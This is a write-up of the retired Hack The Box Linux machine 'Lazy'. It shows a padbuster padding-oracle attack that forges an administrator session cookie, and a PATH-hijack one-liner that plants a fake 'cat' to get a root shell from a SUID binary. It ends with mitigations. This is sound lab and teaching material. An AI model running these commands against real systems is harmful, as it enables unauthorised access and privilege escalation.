---
machine: Lazy
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, padding-oracle, cookie, suid, path-hijack]
---

# Lazy — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The session cookie is CBC-encrypted and the server leaks whether padding is valid. A padding oracle forges an administrator cookie and grants SSH. The SUID `backup` runs `cat` without an absolute path and falls to PATH hijacking.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80 <IP>
curl -s -c cookies.txt http://lazy.htb/login
# Padding oracle on the cookie
padbuster http://lazy.htb/login "SESSION=<COOKIE>" 16 -cookies "SESSION=<COOKIE>"
# After access
find / -perm -4000 -type f 2>/dev/null
strings /usr/bin/backup | grep -i cat
mkdir -p /tmp/bin && printf '#!/bin/sh\n/bin/sh\n' > /tmp/bin/cat && chmod +x /tmp/bin/cat
PATH=/tmp/bin:$PATH /usr/bin/backup
```

## Enumeration

- Flask application with a login and encrypted session cookie.
- Different responses for valid and invalid padding.
- SUID `backup` binary calling `cat` without an absolute path.

## Initial access

Capture the cookie and run a padding oracle to decrypt and modify it. Change the user to administrator, sign the new value and obtain panel access and an SSH key.

## Privilege escalation

`find / -perm -4000` shows `backup`. `strings` reveals it runs `cat` without an absolute path; place a malicious `cat` in `PATH` and the binary runs it as root.

## Evidence

- Forged cookie accepted by the panel.
- SSH access as administrator.
- `backup` with manipulated `PATH` and root shell.

## Lessons learned

- A padding oracle lets you encrypt and modify data without the key.
- A SUID trusting `PATH` is code execution.
- Unencrypted CBC does not authenticate content.

## Mitigation and detection

- Use AES-GCM or sign the cookie with HMAC.
- Do not reveal padding errors.
- Use absolute paths in SUID binaries and sanitize `PATH`.

## References

- [0xdf — Lazy](https://0xdf.gitlab.io/2020/07/29/htb-lazy.html)
- [OWASP — Padding Oracle](https://owasp.org/www-community/attacks/Padding_Oracle_Attack)
- [Hack The Box — Lazy](https://app.hackthebox.com/machines/lazy)
